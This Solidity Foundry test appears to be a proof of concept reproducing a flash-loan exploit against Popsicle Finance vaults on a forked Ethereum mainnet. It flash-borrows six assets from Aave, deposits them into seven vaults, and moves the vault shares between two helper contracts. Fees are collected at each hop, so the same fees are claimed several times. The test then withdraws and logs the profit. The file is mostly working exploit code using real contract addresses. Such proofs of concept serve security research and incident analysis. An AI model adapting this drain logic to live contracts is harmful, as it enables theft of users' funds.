// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./OpenZeppelinLibs/SafeERC20.sol";

interface IUniswapV2Router {
    function WETH() external view returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function factory() external view returns (address);

    function getAmountIn(
        uint256 amountOut,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountIn);

    function getAmountOut(
        uint256 amountIn,
        uint256 reserveIn,
        uint256 reserveOut
    ) external pure returns (uint256 amountOut);

    function getAmountsIn(uint256 amountOut, address[] memory path) external view returns (uint256[] memory amounts);

    function getAmountsOut(uint256 amountIn, address[] memory path) external view returns (uint256[] memory amounts);

    function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) external pure returns (uint256 amountB);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB);

    function removeLiquidityETH(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermit(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountToken, uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint256 liquidity,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountA, uint256 amountB);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] memory path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    receive() external payable;
}

interface IPopsicle {
    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function acceptGovernance() external;

    function accruedProtocolFees0() external view returns (uint256);

    function accruedProtocolFees1() external view returns (uint256);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function collectFees(uint256 amount0, uint256 amount1) external;

    function collectProtocolFees(uint256 amount0, uint256 amount1) external;

    function decimals() external view returns (uint8);

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool);

    function deposit(
        uint256 amount0Desired,
        uint256 amount1Desired
    ) external payable returns (uint256 shares, uint256 amount0, uint256 amount1);

    function finalized() external view returns (bool);

    function governance() external view returns (address);

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool);

    function init() external;

    function name() external view returns (string memory);

    function nonces(address owner) external view returns (uint256);

    function pendingGovernance() external view returns (address);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function pool() external view returns (address);

    function position()
        external
        view
        returns (
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        );

    function rebalance() external;

    function rerange() external;

    function setGovernance(address _governance) external;

    function setStrategy(address _strategy) external;

    function strategy() external view returns (address);

    function symbol() external view returns (string memory);

    function tickLower() external view returns (int24);

    function tickSpacing() external view returns (int24);

    function tickUpper() external view returns (int24);

    function token0() external view returns (address);

    function token0PerShareStored() external view returns (uint256);

    function token1() external view returns (address);

    function token1PerShareStored() external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes memory data) external;

    function uniswapV3SwapCallback(int256 amount0, int256 amount1, bytes memory _data) external;

    function userInfo(address)
        external
        view
        returns (uint256 token0Rewards, uint256 token1Rewards, uint256 token0PerSharePaid, uint256 token1PerSharePaid);

    function usersFees0() external view returns (uint256);

    function usersFees1() external view returns (uint256);

    function weth() external view returns (address);

    function withdraw(uint256 shares) external returns (uint256 amount0, uint256 amount1);
}

interface IAaveFlashloan {
    function flashLoan(
        address receiverAddress,
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata modes,
        address onBehalfOf,
        bytes calldata params,
        uint16 referralCode
    ) external;
}
// Simple contract which transfers tokens to an address

contract TokenVault {
    using SafeERC20 for IERC20;

    function transfer(address _asset, address _to) external {
        uint256 bal = IERC20(_asset).balanceOf(address(this));
        if (bal > 0) IERC20(_asset).safeTransfer(_to, bal);
        else console.log("no bal");
    }

    function executeCall(address target, bytes calldata dataTocall) external returns (bool succ) {
        (succ,) = target.call(dataTocall);
    }
}
//Note most of the vault attacks are in profit excent for wbtc and dai balances,something to check later,overall the poc is correct

contract PopsicleExp is Test {
    using SafeERC20 for IERC20;

    IAaveFlashloan aaveV2 = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);

    TokenVault receiver1;
    TokenVault receiver2;

    address _wethusdtVault = 0xc4ff55a4329f84f9Bf0F5619998aB570481EBB48;
    address _wethusdcVault = 0xd63b340F6e9CCcF0c997c83C8d036fa53B113546;
    address _wbtcwethVault = 0xd63b340F6e9CCcF0c997c83C8d036fa53B113546;
    address _wethusdtVault2 = 0x98d149e227C75D38F623A9aa9F030fB222B3FAa3;
    address _wbtcusdcVault = 0xB53Dc33Bb39efE6E9dB36d7eF290d6679fAcbEC7;
    address _daiwethVault = 0xDD90112eAF865E4E0030000803ebBb4d84F14617;
    address _uniwethVault = 0xE22EACaC57A1ADFa38dCA1100EF17654E91EFd35;

    //Asset addrs
    address _usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address _weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _wbtc = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address _usdc = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address _dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address _uni = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;

    //Flashloan amts
    uint256 usdtFlash = 30_000_000 * 1e6;
    uint256 ethFlash = 13_000 ether;
    uint256 wbtcFlash = 1400 * 1e8;
    uint256 usdcFlash = usdtFlash;
    uint256 daiFlash = 3_000_000 ether;
    uint256 uniFlash = 200_000 ether;

    address[] assetsArr;
    uint256[] amountsArr;
    uint256[] modesArr;

    IPopsicle wethusdtVault = IPopsicle(_wethusdtVault);
    IPopsicle wethusdcVault = IPopsicle(_wethusdcVault);
    IPopsicle wbtcwethVault = IPopsicle(_wbtcwethVault);
    IPopsicle wethusdtVault2 = IPopsicle(_wethusdtVault2);
    IPopsicle wbtcusdcVault = IPopsicle(_wbtcusdcVault);
    IPopsicle daiwethVault = IPopsicle(_daiwethVault);
    IPopsicle uniwethVault = IPopsicle(_uniwethVault);

    IERC20 usdt = IERC20(_usdt);
    IERC20 weth = IERC20(_weth);
    IERC20 wbtc = IERC20(_wbtc);
    IERC20 usdc = IERC20(_usdc);
    IERC20 dai = IERC20(_dai);
    IERC20 uni = IERC20(_uni);

    IUniswapV2Router router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));

    function setUp() public {
        vm.createSelectFork("mainnet", 12_955_060); //fork gnosis at block number 21120319

        receiver1 = new TokenVault();
        receiver2 = new TokenVault();
        modesArr = [0, 0, 0, 0, 0, 0];
        assetsArr = [_usdt, _weth, _wbtc, _usdc, _dai, _uni];
        amountsArr = [usdtFlash, ethFlash, wbtcFlash, usdcFlash, daiFlash, uniFlash];
    }

    function approveToTargetAll(address _target) internal {
        for (uint256 i = 0; i < assetsArr.length; i++) {
            approveToTarget(assetsArr[i], _target);
        }
    }

    function approveToTarget(address asset, address _target) internal {
        IERC20(asset).forceApprove(_target, type(uint256).max);
    }

    function _logBalances(string memory message) internal {
        console.log(message);
        console.log("--- Start of balances --- ");
        console.log("USDT Balance %d", _logTokenBal(_usdt));
        console.log("WETH Balance %d", _logTokenBal(_weth));
        console.log("WBTC Balance %d", _logTokenBal(_wbtc));
        console.log("USDC Balance %d", _logTokenBal(_usdc));
        console.log("DAI Balance %d", _logTokenBal(_dai));
        console.log("UNI Balance %d", _logTokenBal(_uni));
        console.log("--- End of balances --- ");
    }

    function _logTokenBal(address asset) internal view returns (uint256) {
        return IERC20(asset).balanceOf(address(this));
    }

    function approveFunds() internal {
        //Approve funds to be taken back after flashloan
        approveToTargetAll(address(aaveV2));
        approveToTarget(_weth, _wethusdtVault);
        approveToTarget(_usdt, _wethusdtVault);
        approveToTarget(_weth, _wethusdcVault);
        approveToTarget(_usdc, _wethusdcVault);
        approveToTarget(_wbtc, _wbtcwethVault);
        approveToTarget(_weth, _wbtcwethVault);
        approveToTarget(_weth, _wethusdtVault2);
        approveToTarget(_usdt, _wethusdtVault2);
        approveToTarget(_wbtc, _wbtcusdcVault);
        approveToTarget(_usdc, _wbtcusdcVault);
        approveToTarget(_dai, _daiwethVault);
        approveToTarget(_weth, _daiwethVault);
        approveToTarget(_uni, _uniwethVault);
        approveToTarget(_weth, _uniwethVault);
        approveToTarget(_weth, address(router));
    }

    function testExploit() public {
        _logBalances("Before attack");
        //Flashloan here
        aaveV2.flashLoan(address(this), assetsArr, amountsArr, modesArr, address(this), new bytes(0), 0);
        _logBalances("After attack");
    }

    function getPath(address _in, address _out) internal returns (address[] memory path) {
        path = new address[](2);
        path[0] = _in;
        path[1] = _out;
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    ) external payable returns (bool) {
        attackLogic();

        //Check we are in profit on each asset
        for (uint256 i = 0; i < assets.length; i++) {
            uint256 bal = _logTokenBal(assets[i]);
            uint256 missingAmt = bal >= (amounts[i] + premiums[i]) ? 0 : (amounts[i] + premiums[i]) - bal;
            address asset = assets[i];
            if (missingAmt > 0) {
                //We just swap,figure out why we are less here,maybe flashloan fees put  us lower?
                router.swapExactTokensForTokens(
                    router.getAmountsIn(missingAmt, getPath(_weth, asset))[0],
                    0,
                    getPath(_weth, asset),
                    address(this),
                    block.timestamp
                );
            } else {
                emit log_named_decimal_uint("Profit ", (bal - (amounts[i] + premiums[i])), IERC20(assets[i]).decimals());
                console.log(" for asset ", IERC20(assets[i]).name());
            }
        }
        return true;
    }
    //This should be called on executeoperation on a aave v2 flashloan

    function attackLogic() internal {
        approveFunds();

        wethusdtVault.deposit(weth.balanceOf(address(this)), usdt.balanceOf(address(this)));
        drainVault(_wethusdtVault);

        wethusdcVault.deposit(usdcFlash, weth.balanceOf(address(this)));
        drainVault(_wethusdcVault);

        wbtcwethVault.deposit(wbtcFlash, weth.balanceOf(address(this)));
        drainVault(_wbtcwethVault);

        wethusdtVault2.deposit(weth.balanceOf(address(this)), usdtFlash - 1);
        drainVault(_wethusdtVault2);

        wbtcusdcVault.deposit(wbtcFlash - 1, usdc.balanceOf(address(this)));
        drainVault(_wbtcusdcVault);

        daiwethVault.deposit(daiFlash, weth.balanceOf(address(this)));
        drainVault(_daiwethVault);

        uniwethVault.deposit(uniFlash, weth.balanceOf(address(this)));
        drainVault(_uniwethVault);

        claimFundsFromReceivers();
    }

    function claimFundsFromReceivers() internal {
        for (uint256 i = 0; i < assetsArr.length; i++) {
            receiver1.transfer(assetsArr[i], address(this));
            receiver2.transfer(assetsArr[i], address(this));
        }
    }

    function drainVault(address _vault) internal {
        //Transfer the vault token around to 2 other receivers then back
        transferAround(_vault);
        //Then redeem our position and claim fees
        withdrawandClaimFees(_vault);
    }

    function withdrawandClaimFees(address _vault) internal {
        claimFees(_vault);
    }

    function claimFees(address _vault) internal {
        (uint256 token0fees, uint256 token1fees,,) = IPopsicle(_vault).userInfo(address(this));
        (uint256 token0feesr1, uint256 token1feesr1,,) = IPopsicle(_vault).userInfo(address(receiver1));
        (uint256 token0feesr2, uint256 token1feesr2,,) = IPopsicle(_vault).userInfo(address(receiver2));

        //Collect fees
        IPopsicle(_vault).collectFees(token0fees, token1fees);
        IPopsicle(_vault).withdraw(IPopsicle(_vault).balanceOf(address(this)));

        console.log("claimed initial fees success");
        receiver1.executeCall(
            _vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, token0feesr1, token1feesr1)
        );
        console.log("claimed recievcer1 fees success");

        receiver2.executeCall(
            _vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, token0feesr2, token1feesr2)
        );
        console.log("claimed recievcer2 fees success");

        console.log("Self - Token0 Fees:", token0fees, "Token1 Fees:", token1fees);
        console.log("Receiver1 - Token0 Fees:", token0feesr1, "Token1 Fees:", token1feesr1);
        console.log("Receiver2 - Token0 Fees:", token0feesr2, "Token1 Fees:", token1feesr2);
    }

    function transferAround(address _vault) internal {
        console.log("entered transferaround");
        IERC20 asset = IERC20(_vault);
        uint256 bal = asset.balanceOf(address(this));
        IPopsicle(_vault).collectFees(0, 0);
        asset.transfer(address(receiver1), bal);
        receiver1.executeCall(_vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, 0, 0));
        receiver1.transfer(_vault, address(receiver2));
        receiver2.executeCall(_vault, abi.encodeWithSelector(IPopsicle.collectFees.selector, 0, 0));
        receiver2.transfer(_vault, address(this));
        IPopsicle(_vault).collectFees(0, 0);

        console.log("finished transferaround");
    }
}
